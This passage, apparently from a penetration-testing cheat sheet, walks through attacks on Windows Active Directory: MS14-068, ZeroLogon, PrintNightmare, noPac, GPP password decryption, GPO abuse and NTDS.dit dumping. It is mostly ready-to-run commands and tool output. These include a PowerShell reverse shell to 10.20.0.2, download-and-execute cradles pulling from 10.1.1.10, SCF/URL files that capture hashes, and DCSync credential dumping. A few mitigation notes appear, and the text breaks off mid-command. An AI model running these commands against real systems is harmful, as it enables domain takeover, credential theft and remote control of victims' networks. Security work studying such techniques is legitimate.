https://github.com/gentilkiwi/kekeo/wiki/ms14068 Generate a ticket with metasploit or pykek Metasploit: auxiliary/admin/kerberos/ms14_068_kerberos_checksum Name Current Setting Required Description ---- --------------- -------- ----------- DOMAIN LABDOMAIN.LOCAL yes The Domain (upper case) Ex: DEMO.LOCAL PASSWORD P@ssw0rd yes The Domain User password RHOSTS 10.10.10.10 yes The target address range or CIDR identifier RPORT 88 yes The target port Timeout 10 yes The TCP timeout to establish connection and read data USER lambda yes The Domain User USER_SID S-1-5-21-297520375-2634728305-5197346142-1106 yes The Domain User SID, Ex: S-1-5-21-1755879683-3641577184-3486455962-1000 # Alternative download: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek $ git clone https://github.com/SecWiki/windows-kernel-exploits $ python ./ms14-068.py -u <userName>@<domainName> -s <userSid> -d <domainControlerAddr> -p <clearPassword> $ python ./ms14-068.py -u darthsidious@lab.adsecurity.org -p TheEmperor99! -s S-1-5-21-1473643419-774954089-2222329127-1110 -d adsdc02.lab.adsecurity.org $ python ./ms14-068.py -u john.smith@pwn3d.local -s S-1-5-21-2923581646-3335815371-2872905324-1107 -d 192.168.115.10 $ python ms14-068.py -u user01@metasploitable.local -d msfdc01.metasploitable.local -p Password1 -s S-1-5-21-2928836948-3642677517-2073454066 -1105 [+] Building AS-REQ for msfdc01.metasploitable.local... Done! [+] Sending AS-REQ to msfdc01.metasploitable.local... Done! [+] Receiving AS-REP from msfdc01.metasploitable.local... Done! [+] Parsing AS-REP from msfdc01.metasploitable.local... Done! [+] Building TGS-REQ for msfdc01.metasploitable.local... Done! [+] Sending TGS-REQ to msfdc01.metasploitable.local... Done! [+] Receiving TGS-REP from msfdc01.metasploitable.local... Done! [+] Parsing TGS-REP from msfdc01.metasploitable.local... Done! [+] Creating ccache file 'TGT_user01@metasploitable.local.ccache'... Done! Then use mimikatz to load the ticket. mimikatz.exe \"kerberos::ptc c:\\temp\\TGT_darthsidious@lab.adsecurity.org.ccache\" :warning: If the clock is skewed use clock-skew.nse script from nmap Linux> $ nmap -sV -sC 10.10.10.10 clock-skew: mean: -1998d09h03m04s, deviation: 4h00m00s, median: -1998d11h03m05s Linux> sudo date -s \"14 APR 2015 18:25:16\" Windows> net time /domain /set Mitigations Ensure the DCPromo process includes a patch QA step before running DCPromo that checks for installation of KB3011780. The quick and easy way to perform this check is with PowerShell: get-hotfix 3011780 From CVE to SYSTEM shell on DC Sometimes you will find a Domain Controller without the latest patches installed, use the newest CVE to gain a SYSTEM shell on it. If you have a \"normal user\" shell on the DC you can also try to elevate your privileges using one of the methods listed in Windows - Privilege Escalation ZeroLogon CVE-2020-1472 White Paper from Secura : https://www.secura.com/pathtoimg.php?id=2055 Exploit steps from the white paper Spoofing the client credential Disabling signing and sealing Spoofing a call Changing a computer's AD password to null From password change to domain admin :warning: reset the computer's AD password in a proper way to avoid any Deny of Service cve-2020-1472-exploit.py - Python script from dirkjanm ```powershell # Check (https://github.com/SecuraBV/CVE-2020-1472) proxychains python3 zerologon_tester.py DC01 172.16.1.5 $ git clone https://github.com/dirkjanm/CVE-2020-1472.git # Activate a virtual env to install impacket $ python3 -m venv venv $ source venv/bin/activate $ pip3 install . # Exploit the CVE (https://github.com/dirkjanm/CVE-2020-1472/blob/master/cve-2020-1472-exploit.py) proxychains python3 cve-2020-1472-exploit.py DC01 172.16.1.5 # Find the old NT hash of the DC proxychains secretsdump.py -history -just-dc-user 'DC01$' -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'CORP/DC01$@DC01.CORP.LOCAL' # Restore password from secretsdump # secretsdump will automatically dump the plaintext machine password (hex encoded) # when dumping the local registry secrets on the newest version python restorepassword.py CORP/DC01@DC01.CORP.LOCAL -target-ip 172.16.1.5 -hexpass e6ad4c4f64e71cf8c8020aa44bbd70ee711b8dce2adecd7e0d7fd1d76d70a848c987450c5be97b230bd144f3c3 deactivate ``` nccfsas - .NET binary for Cobalt Strike's execute-assembly ```powershell git clone https://github.com/nccgroup/nccfsas # Check execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local # Resetting the machine account password execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local -reset # Testing from a non Domain-joined machine execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local -patch # Now reset the password back ``` Mimikatz - 2.2.0 20200917 Post-Zerologon ```powershell privilege::debug # Check for the CVE lsadump::zerologon /target:DC01.LAB.LOCAL /account:DC01$ # Exploit the CVE and set the computer account's password to \"\" lsadump::zerologon /target:DC01.LAB.LOCAL /account:DC01$ /exploit # Execute dcsync to extract some hashes lsadump::dcsync /domain:LAB.LOCAL /dc:DC01.LAB.LOCAL /user:krbtgt /authuser:DC01$ /authdomain:LAB /authpassword:\"\" /authntlm lsadump::dcsync /domain:LAB.LOCAL /dc:DC01.LAB.LOCAL /user:Administrator /authuser:DC01$ /authdomain:LAB /authpassword:\"\" /authntlm # Pass The Hash with the extracted Domain Admin hash sekurlsa::pth /user:Administrator /domain:LAB /rc4:HASH_NTLM_ADMIN # Use IP address instead of FQDN to force NTLM with Windows APIs # Reset password to Waza1234/Waza1234/Waza1234/ # https://github.com/gentilkiwi/mimikatz/blob/6191b5a8ea40bbd856942cbc1e48a86c3c505dd3/mimikatz/modules/kuhl_m_lsadump.c#L2584 lsadump::postzerologon /target:10.10.10.10 /account:DC01$ ``` CrackMapExec - only check powershell crackmapexec smb 10.10.10.10 -u username -p password -d domain -M zerologon PrintNightmare CVE-2021-1675 / CVE-2021-34527 The DLL will be stored in C:\\Windows\\System32\\spool\\drivers\\x64\\3\\ . The exploit will execute the DLL either from the local filesystem or a remote share. Requirements: * Spooler Service enabled (Mandatory) * Server with patches < June 2021 * DC with Pre Windows 2000 Compatibility group * Server with registry key HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint\\NoWarningNoElevationOnInstall = (DWORD) 1 * Server with registry key HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA = (DWORD) 0 Detect the vulnerability : * Impacket - rpcdump ps1 python3 ./rpcdump.py @10.0.2.10 | egrep 'MS-RPRN|MS-PAR' Protocol: [MS-RPRN]: Print System Remote Protocol * It Was All A Dream ps1 git clone https://github.com/byt3bl33d3r/ItWasAllADream cd ItWasAllADream && poetry install && poetry shell itwasalladream -u user -p Password123 -d domain 10.10.10.10/24 docker run -it itwasalladream -u username -p Password123 -d domain 10.10.10.10 Trigger the exploit : NOTE : The payload can be hosted on Impacket SMB server since PR #1109 : python3 ./smbserver.py share /tmp/smb/ or using Invoke-BuildAnonymousSMBServer : Import-Module .\\Invoke-BuildAnonymousSMBServer.ps1; Invoke-BuildAnonymousSMBServer -Path C:\\Share -Mode Enable SharpNightmare powershell # require a modified Impacket: https://github.com/cube0x0/impacket python3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\\\192.168.1.215\\smb\\addCube.dll' python3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 'C:\\addCube.dll' ## LPE SharpPrintNightmare.exe C:\\addCube.dll ## RCE using existing context SharpPrintNightmare.exe '\\\\192.168.1.215\\smb\\addCube.dll' 'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_addb31f9bff9e936\\Amd64\\UNIDRV.DLL' '\\\\192.168.1.20' ## RCE using runas /netonly SharpPrintNightmare.exe '\\\\192.168.1.215\\smb\\addCube.dll' 'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_83aa9aebf5dffc96\\Amd64\\UNIDRV.DLL' '\\\\192.168.1.10' hackit.local domain_user Pass123 Invoke-Nightmare powershell ## LPE only (PS1 + DLL) Import-Module .\\cve-2021-1675.ps1 Invoke-Nightmare # add user `adm1n`/`P@ssw0rd` in the local admin group by default Invoke-Nightmare -DriverName \"Dementor\" -NewUser \"d3m3nt0r\" -NewPassword \"AzkabanUnleashed123*\" Invoke-Nightmare -DLL \"C:\\absolute\\path\\to\\your\\bindshell.dll\" Mimikatz v2.2.0-20210709+ powershell ## LPE misc::printnightmare /server:DC01 /library:C:\\Users\\user1\\Documents\\mimispool.dll ## RCE misc::printnightmare /server:CASTLE /library:\\\\10.0.2.12\\smb\\beacon.dll /authdomain:LAB /authuser:Username /authpassword:Password01 /try:50 PrintNightmare - @outflanknl powershell PrintNightmare [target ip or hostname] [UNC path to payload Dll] [optional domain] [optional username] [optional password] Debug informations Error Message Debug 0x5 rpc_s_access_denied Permissions on the file in the SMB share 0x525 ERROR_NO_SUCH_USER The specified account does not exist. 0x180 unknown error code Share is not SMB2 samAccountName spoofing During S4U2Self, the KDC will try to append a '\\$' to the computer name specified in the TGT, if the computer name is not found. An attacker can create a new machine account with the sAMAccountName set to a domain controller's sAMAccountName - without the '\\$'. For instance, suppose there is a domain controller with a sAMAccountName set to 'DC\\$'. An attacker would then create a machine account with the sAMAccountName set to 'DC'. The attacker can then request a TGT for the newly created machine account. After the TGT has been issued by the KDC, the attacker can rename the newly created machine account to something different, e.g. JOHNS-PC. The attacker can then perform S4U2Self and request a TGS to itself as any user. Since the machine account with the sAMAccountName set to 'DC' has been renamed, the KDC will try to find the machine account by appending a '$', which will then match the domain controller. The KDC will then issue a valid TGS for the domain controller. Requirements MachineAccountQuota > 0 Check for exploitation Check the MachineAccountQuota of the account powershell crackmapexec ldap 10.10.10.10 -u username -p 'Password123' -d 'domain.local' --kdcHost 10.10.10.10 -M MAQ StandIn.exe --object ms-DS-MachineAccountQuota=* Check if the DC is vulnerable powershell crackmapexec smb 10.10.10.10 -u '' -p '' -d domain -M nopac Exploitation Create a computer account ```powershell impacket@linux> addcomputer.py -computer-name 'ControlledComputer$' -computer-pass 'ComputerPassword' -dc-host DC01 -domain-netbios domain 'domain.local/user1:complexpassword' powermad@windows> . .\\Powermad.ps1 powermad@windows> $password = ConvertTo-SecureString 'ComputerPassword' -AsPlainText -Force powermad@windows> New-MachineAccount -MachineAccount \"ControlledComputer\" -Password $($password) -Domain \"domain.local\" -DomainController \"DomainController.domain.local\" -Verbose sharpmad@windows> Sharpmad.exe MAQ -Action new -MachineAccount ControlledComputer -MachinePassword ComputerPassword 1. Clear the controlled machine account `servicePrincipalName` attribute ps1 impacket@linux> addspn.py -u 'domain\\user' -p 'password' -t 'ControlledComputer$' -c DomainController powershell@windows> . .\\Powerview.ps1 powershell@windows> Set-DomainObject \"CN=ControlledComputer,CN=Computers,DC=domain,DC=local\" -Clear 'serviceprincipalname' -Verbose 2. (CVE-2021-42278) Change the controlled machine account `sAMAccountName` to a Domain Controller's name without the trailing `$` ps1 https://github.com/SecureAuthCorp/impacket/pull/1224 impacket@linux> renameMachine.py -current-name 'ControlledComputer$' -new-name 'DomainController' -dc-ip 'DomainController.domain.local' 'domain.local'/'user':'password' powermad@windows> Set-MachineAccountAttribute -MachineAccount \"ControlledComputer\" -Value \"DomainController\" -Attribute samaccountname -Verbose 3. Request a TGT for the controlled machine account ps1 impacket@linux> getTGT.py -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController':'ComputerPassword' cmd@windows> Rubeus.exe asktgt /user:\"DomainController\" /password:\"ComputerPassword\" /domain:\"domain.local\" /dc:\"DomainController.domain.local\" /nowrap 4. Reset the controlled machine account sAMAccountName to its old value ps1 impacket@linux> renameMachine.py -current-name 'DomainController' -new-name 'ControlledComputer$' 'domain.local'/'user':'password' powermad@windows> Set-MachineAccountAttribute -MachineAccount \"ControlledComputer\" -Value \"ControlledComputer\" -Attribute samaccountname -Verbose 5. (CVE-2021-42287) Request a service ticket with `S4U2self` by presenting the TGT obtained before ps1 https://github.com/SecureAuthCorp/impacket/pull/1202 impacket@linux> KRB5CCNAME='DomainController.ccache' getST.py -self -impersonate 'DomainAdmin' -spn 'cifs/DomainController.domain.local' -k -no-pass -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController' cmd@windows> Rubeus.exe s4u /self /impersonateuser:\"DomainAdmin\" /altservice:\"ldap/DomainController.domain.local\" /dc:\"DomainController.domain.local\" /ptt /ticket:[Base64 TGT] `` 6. DCSync: KRB5CCNAME='DomainAdmin.ccache' secretsdump.py -just-dc-user 'krbtgt' -k -no-pass -dc-ip 'DomainController.domain.local' @'DomainController.domain.local'` Automated exploitation: noPac - @cube0x0 powershell noPac.exe scan -domain htb.local -user user -pass 'password123' noPac.exe -domain htb.local -user domain_user -pass 'Password123!' /dc dc.htb.local /mAccount demo123 /mPassword Password123! /service cifs /ptt noPac.exe -domain htb.local -user domain_user -pass \"Password123!\" /dc dc.htb.local /mAccount demo123 /mPassword Password123! /service ldaps /ptt /impersonate Administrator sam_the_admin - @WazeHell ps1 $ python3 sam_the_admin.py \"caltech/alice.cassie:Lee@tPass\" -dc-ip 192.168.1.110 -shell [*] Selected Target dc.caltech.white [*] Total Domain Admins 11 [*] will try to impersonat gaylene.dreddy [*] Current ms-DS-MachineAccountQuota = 10 [*] Adding Computer Account \"SAMTHEADMIN-11$\" [*] MachineAccount \"SAMTHEADMIN-11$\" password = EhFMT%mzmACL [*] Successfully added machine account SAMTHEADMIN-11$ with password EhFMT%mzmACL. [*] SAMTHEADMIN-11$ object = CN=SAMTHEADMIN-11,CN=Computers,DC=caltech,DC=white [*] SAMTHEADMIN-11$ sAMAccountName == dc [*] Saving ticket in dc.ccache [*] Resting the machine account to SAMTHEADMIN-11$ [*] Restored SAMTHEADMIN-11$ sAMAccountName to original value [*] Using TGT from cache [*] Impersonating gaylene.dreddy [*] Requesting S4U2self [*] Saving ticket in gaylene.dreddy.ccache [!] Launching semi-interactive shell - Careful what you execute C:\\Windows\\system32>whoami nt authority\\system Pachine - @ly4k powershell usage: pachine.py [-h] [-scan] [-spn SPN] [-impersonate IMPERSONATE] [-domain-netbios NETBIOSNAME] [-computer-name NEW-COMPUTER-NAME$] [-computer-pass password] [-debug] [-method {SAMR,LDAPS}] [-port {139,445,636}] [-baseDN DC=test,DC=local] [-computer-group CN=Computers,DC=test,DC=local] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] -dc-host hostname [-dc-ip ip] [domain/]username[:password] $ python3 pachine.py -dc-host dc.predator.local -scan 'predator.local/john:Passw0rd!' $ python3 pachine.py -dc-host dc.predator.local -spn cifs/dc.predator.local -impersonate administrator 'predator.local/john:Passw0rd!' $ export KRB5CCNAME=$PWD/administrator@predator.local.ccache $ impacket-psexec -k -no-pass 'predator.local/administrator@dc.predator.local' Mitigations : * KB5007247 - Windows Server 2012 R2 * KB5008601 - Windows Server 2016 * KB5008602 - Windows Server 2019 * KB5007205 - Windows Server 2022 * KB5008102 * KB5008380 Open Shares Some shares can be accessible without authentication, explore them to find some juicy files smbmap powershell smbmap -H 10.10.10.10 # null session smbmap -H 10.10.10.10 -R # recursive listing smbmap -H 10.10.10.10 -u invaliduser # guest smb session smbmap -H 10.10.10.10 -d \"DOMAIN.LOCAL\" -u \"USERNAME\" -p \"Password123*\" pth-smbclient from path-toolkit powershell pth-smbclient -U \"AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A\" //192.168.10.100/Share pth-smbclient -U \"AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A\" //192.168.10.100/C$ ls # list files cd # move inside a folder get # download files put # replace a file smbclient from Impacket powershell smbclient -I 10.10.10.100 -L ACTIVE -N -U \"\" Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC NETLOGON Disk Logon server share Replication Disk SYSVOL Disk Logon server share Users Disk use Sharename # select a Sharename cd Folder # move inside a folder ls # list files smbclient - from Samba, ftp-like client to access SMB/CIFS resources on servers ```powershell smbclient -U username //10.0.0.1/SYSVOL smbclient //10.0.0.1/Share # Download a folder recursively smb: > mask \"\" smb: > recurse ON smb: > prompt OFF smb: > lcd '/path/to/go/' smb: > mget * ``` SCF and URL file attack against writeable share Theses attacks can be automated with Farmer.exe and Crop.exe # Farmer to receive auth farmer.exe <port> [seconds] [output] farmer.exe 8888 0 c:\\windows\\temp\\test.tmp # undefinitely farmer.exe 8888 60 # one minute # Crop can be used to create various file types that will trigger SMB/WebDAV connections for poisoning file shares during hash collection attacks crop.exe <output folder> <output filename> <WebDAV server> <LNK value> [options] Crop.exe \\\\\\\\fileserver\\\\common mdsec.url \\\\\\\\workstation@8888\\\\mdsec.ico Crop.exe \\\\\\\\fileserver\\\\common mdsec.library-ms \\\\\\\\workstation@8888\\\\mdsec SCF Files Drop the following @something.scf file inside a share and start listening with Responder : responder -wrf --lm -v -I eth0 [Shell] Command=2 IconFile=\\\\10.10.10.10\\Share\\test.ico [Taskbar] Command=ToggleDesktop Using crackmapexec : crackmapexec smb 10.10.10.10 -u username -p password -M scuffy -o NAME=WORK SERVER=IP_RESPONDER #scf crackmapexec smb 10.10.10.10 -u username -p password -M slinky -o NAME=WORK SERVER=IP_RESPONDER #lnk crackmapexec smb 10.10.10.10 -u username -p password -M slinky -o NAME=WORK SERVER=IP_RESPONDER CLEANUP URL Files This attack also works with .url files and responder -I eth0 -v . [InternetShortcut] URL=whatever WorkingDirectory=whatever IconFile=\\\\10.10.10.10\\%USERNAME%.icon IconIndex=1 Windows Library Files Windows Library Files (.library-ms) <?xml version=\"1.0\" encoding=\"UTF-8\"?> <libraryDescription xmlns=\"<http://schemas.microsoft.com/windows/2009/library>\"> <name>@windows.storage.dll,-34582</name> <version>6</version> <isLibraryPinned>true</isLibraryPinned> <iconReference>imageres.dll,-1003</iconReference> <templateInfo> <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType> </templateInfo> <searchConnectorDescriptionList> <searchConnectorDescription> <isDefaultSaveLocation>true</isDefaultSaveLocation> <isSupported>false</isSupported> <simpleLocation> <url>\\\\\\\\workstation@8888\\\\folder</url> </simpleLocation> </searchConnectorDescription> </searchConnectorDescriptionList> </libraryDescription> Windows Search Connectors Files Windows Search Connectors (.searchConnector-ms) <?xml version=\"1.0\" encoding=\"UTF-8\"?> <searchConnectorDescription xmlns=\"<http://schemas.microsoft.com/windows/2009/searchConnector>\"> <iconReference>imageres.dll,-1002</iconReference> <description>Microsoft Outlook</description> <isSearchOnlyItem>false</isSearchOnlyItem> <includeInStartMenuScope>true</includeInStartMenuScope> <iconReference>\\\\\\\\workstation@8888\\\\folder.ico</iconReference> <templateInfo> <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType> </templateInfo> <simpleLocation> <url>\\\\\\\\workstation@8888\\\\folder</url> </simpleLocation> </searchConnectorDescription> Passwords in SYSVOL & Group Policy Preferences Find password in SYSVOL (MS14-025). SYSVOL is the domain-wide share in Active Directory to which all authenticated users have read access. All domain Group Policies are stored here: \\\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\ . findstr /S /I cpassword \\\\<FQDN>\\sysvol\\<FQDN>\\policies\\*.xml Decrypt a Group Policy Password found in SYSVOL (by 0x00C651E0 ), using the 32-byte AES key provided by Microsoft in the MSDN - 2.2.1.1.4 Password Encryption echo 'password_in_base64' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000 e.g: echo '5OPdEKwZSf7dYAvLOe6RzRDtcvT/wCP8g5RqmAgjSso=' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000 echo 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000 Automate the SYSVOL and passwords research Metasploit modules to enumerate shares and credentials c scanner/smb/smb_enumshares post/windows/gather/enum_shares post/windows/gather/credentials/gpp CrackMapExec modules powershell cme smb 10.10.10.10 -u Administrator -H 89[...]9d -M gpp_autologin cme smb 10.10.10.10 -u Administrator -H 89[...]9d -M gpp_password Get-GPPPassword ```powershell # with a NULL session Get-GPPPassword.py -no-pass 'DOMAIN_CONTROLLER' # with cleartext credentials Get-GPPPassword.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER' # pass-the-hash Get-GPPPassword.py -hashes 'LMhash':'NThash' 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER' ``` Mitigations Install KB2962486 on every computer used to manage GPOs which prevents new credentials from being placed in Group Policy Preferences. Delete existing GPP xml files in SYSVOL containing passwords. Don\u2019t put passwords in files that are accessible by all authenticated users. Exploit Group Policy Objects GPO Creators of a GPO are automatically granted explicit Edit settings, delete, modify security, which manifests as CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner :triangular_flag_on_post: GPO Priorization : Organization Unit > Domain > Site > Local GPO are stored in the DC in \\\\<domain.dns>\\SYSVOL\\<domain.dns>\\Policies\\<GPOName>\\ , inside two folders User and Machine . If you have the right to edit the GPO you can connect to the DC and replace the files. Planned Tasks are located at Machine\\Preferences\\ScheduledTasks . :warning: Domain members refresh group policy settings every 90 minutes by default but it can locally be forced with the following command: gpupdate /force . Find vulnerable GPO Look a GPLink where you have the Write right. Get-DomainObjectAcl -Identity \"SuperSecureGPO\" -ResolveGUIDs | Where-Object {($_.ActiveDirectoryRights.ToString() -match \"GenericWrite|AllExtendedWrite|WriteDacl|WriteProperty|WriteMember|GenericAll|WriteOwner\")} Abuse GPO with SharpGPOAbuse # Build and configure SharpGPOAbuse $ git clone https://github.com/FSecureLABS/SharpGPOAbuse $ Install-Package CommandLineParser -Version 1.9.3.15 $ ILMerge.exe /out:C:\\SharpGPOAbuse.exe C:\\Release\\SharpGPOAbuse.exe C:\\Release\\CommandLine.dll # Adding User Rights .\\SharpGPOAbuse.exe --AddUserRights --UserRights \"SeTakeOwnershipPrivilege,SeRemoteInteractiveLogonRight\" --UserAccount bob.smith --GPOName \"Vulnerable GPO\" # Adding a Local Admin .\\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount bob.smith --GPOName \"Vulnerable GPO\" # Configuring a User or Computer Logon Script .\\SharpGPOAbuse.exe --AddUserScript --ScriptName StartupScript.bat --ScriptContents \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\\\"\" --GPOName \"Vulnerable GPO\" # Configuring a Computer or User Immediate Task # /!\\ Intended to \"run once\" per GPO refresh, not run once per system .\\SharpGPOAbuse.exe --AddComputerTask --TaskName \"Update\" --Author DOMAIN\\Admin --Command \"cmd.exe\" --Arguments \"/c powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\\\"\" --GPOName \"Vulnerable GPO\" .\\SharpGPOAbuse.exe --AddComputerTask --GPOName \"VULNERABLE_GPO\" --Author 'LAB.LOCAL\\User' --TaskName \"EvilTask\" --Arguments \"/c powershell.exe -nop -w hidden -enc BASE64_ENCODED_COMMAND \" --Command \"cmd.exe\" --Force Abuse GPO with PowerGPOAbuse https://github.com/rootSySdk/PowerGPOAbuse PS> . .\\PowerGPOAbuse.ps1 # Adding a localadmin PS> Add-LocalAdmin -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO' # Assign a new right PS> Add-UserRights -Rights \"SeLoadDriverPrivilege\",\"SeDebugPrivilege\" -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO' # Adding a New Computer/User script PS> Add-ComputerScript/Add-UserScript -ScriptName 'EvilScript' -ScriptContent $(Get-Content evil.ps1) -GPOIdentity 'SuperSecureGPO' # Create an immediate task PS> Add-GPOImmediateTask -TaskName 'eviltask' -Command 'powershell.exe /c' -CommandArguments \"'$(Get-Content evil.ps1)'\" -Author Administrator -Scope Computer/User -GPOIdentity 'SuperSecureGPO' Abuse GPO with pyGPOAbuse $ git clone https://github.com/Hackndo/pyGPOAbuse # Add john user to local administrators group (Password: H4x00r123..) ./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id \"12345677-ABCD-9876-ABCD-123456789012\" # Reverse shell example ./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id \"12345677-ABCD-9876-ABCD-123456789012\" \\ -powershell \\ -command \"\\$client = New-Object System.Net.Sockets.TCPClient('10.20.0.2',1234);\\$stream = \\$client.GetStream();[byte[]]\\$bytes = 0..65535|%{0};while((\\$i = \\$stream.Read(\\$bytes, 0, \\$bytes.Length)) -ne 0){;\\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\\$bytes,0, \\$i);\\$sendback = (iex \\$data 2>&1 | Out-String );\\$sendback2 = \\$sendback + 'PS ' + (pwd).Path + '> ';\\$sendbyte = ([text.encoding]::ASCII).GetBytes(\\$sendback2);\\$stream.Write(\\$sendbyte,0,\\$sendbyte.Length);\\$stream.Flush()};\\$client.Close()\" \\ -taskname \"Completely Legit Task\" \\ -description \"Dis is legit, pliz no delete\" \\ -user Abuse GPO with PowerView # Enumerate GPO Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} # New-GPOImmediateTask to push an Empire stager out to machines via VulnGPO New-GPOImmediateTask -TaskName Debugging -GPODisplayName VulnGPO -CommandArguments '-NoP -NonI -W Hidden -Enc AAAAAAA...' -Force Abuse GPO with StandIn # Add a local administrator StandIn.exe --gpo --filter Shards --localadmin user002 # Set custom right to a user StandIn.exe --gpo --filter Shards --setuserrights user002 --grant \"SeDebugPrivilege,SeLoadDriverPrivilege\" # Execute a custom command StandIn.exe --gpo --filter Shards --tasktype computer --taskname Liber --author \"REDHOOK\\Administrator\" --command \"C:\\I\\do\\the\\thing.exe\" --args \"with args\" Dumping AD Domain Credentials You will need the following files to extract the ntds : - NTDS.dit file - SYSTEM hive ( C:\\Windows\\System32\\SYSTEM ) Usually you can find the ntds in two locations : systemroot\\NTDS\\ntds.dit and systemroot\\System32\\ntds.dit . - systemroot\\NTDS\\ntds.dit stores the database that is in use on a domain controller. It contains the values for the domain and a replica of the values for the forest (the Configuration container data). - systemroot\\System32\\ntds.dit is the distribution copy of the default directory that is used when you install Active Directory on a server running Windows Server 2003 or later to create a domain controller. Because this file is available, you can run the Active Directory Installation Wizard without having to use the server operating system CD. However you can change the location to a custom one, you will need to query the registry to get the current location. reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters /v \"DSA Database file\" Using ndtsutil C:\\>ntdsutil ntdsutil: activate instance ntds ntdsutil: ifm ifm: create full c:\\pentest ifm: quit ntdsutil: quit or ntdsutil \"ac i ntds\" \"ifm\" \"create full c:\\temp\" q q Using Vshadow vssadmin create shadow /for=C : Copy Shadow_Copy_Volume_Name\\windows\\ntds\\ntds.dit c:\\ntds.dit You can also use the Nishang script, available at : https://github.com/samratashok/nishang Import-Module .\\Copy-VSS.ps1 Copy-VSS Copy-VSS -DestinationDir C:\\ShadowCopy\\ Using vssadmin vssadmin create shadow /for=C: copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit C:\\ShadowCopy copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\ShadowCopy Using DiskShadow (a Windows signed binary) diskshadow.txt contains : set context persistent nowriters add volume c: alias someAlias create expose %someAlias% z: exec \"cmd.exe\" /c copy z:\\windows\\ntds\\ntds.dit c:\\exfil\\ntds.dit delete shadows volume %someAlias% reset then: NOTE - must be executed from C:\\Windows\\System32 diskshadow.exe /s c:\\diskshadow.txt dir c:\\exfil reg.exe save hklm\\system c:\\exfil\\system.bak Using esentutl.exe Copy/extract a locked file such as the AD Database esentutl.exe /y /vss c:\\windows\\ntds\\ntds.dit /d c:\\folder\\ntds.dit Extract hashes from ntds.dit then you need to use secretsdump to extract the hashes, use the LOCAL options to use it on a retrieved ntds.dit secretsdump.py -system /root/SYSTEM -ntds /root/ntds.dit LOCAL secretsdump also works remotely ./secretsdump.py -dc-ip IP AD\\administrator@domain -use-vss -pwd-last-set -user-status ./secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc\\$@10.0.0.1 -pwd-last-set : Shows pwdLastSet attribute for each NTDS.DIT account. -user-status : Display whether or not the user is disabled. Alternatives - modules Metasploit modules windows/gather/credentials/domain_hashdump PowerSploit module Invoke-NinjaCopy --path c:\\windows\\NTDS\\ntds.dit --verbose --localdestination c:\\ntds.dit CrackMapExec module cme smb 10.10.0.202 -u username -p password --ntds vss cme smb 10.10.0.202 -u username -p password --ntds drsuapi #default Using Mimikatz DCSync Any member of Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts are able to run DCSync to pull password data. # DCSync only one user mimikatz# lsadump::dcsync /domain:htb.local /user:krbtgt # DCSync all users of the domain mimikatz# lsadump::dcsync /domain:htb.local /all /csv :warning: Read-Only Domain Controllers are not allowed to pull password data for users by default. Using Mimikatz sekurlsa Dumps credential data in an Active Directory domain when run on a Domain Controller. :warning: Requires administrator access with debug or Local SYSTEM rights sekurlsa::krbtgt lsadump::lsa /inject /name:krbtgt Crack NTLM hashes with hashcat Useful when you want to have the clear text password or when you need to make stats about weak passwords. Recommended wordlists: - Rockyou.txt - Have I Been Pwned founds - Weakpass.com - Read More at Methodology and Resources/Hash Cracking.md # Basic wordlist # (-O) will Optimize for 32 characters or less passwords # (-w 4) will set the workload to \"Insane\" $ hashcat64.exe -m 1000 -w 4 -O -a 0 -o pathtopotfile 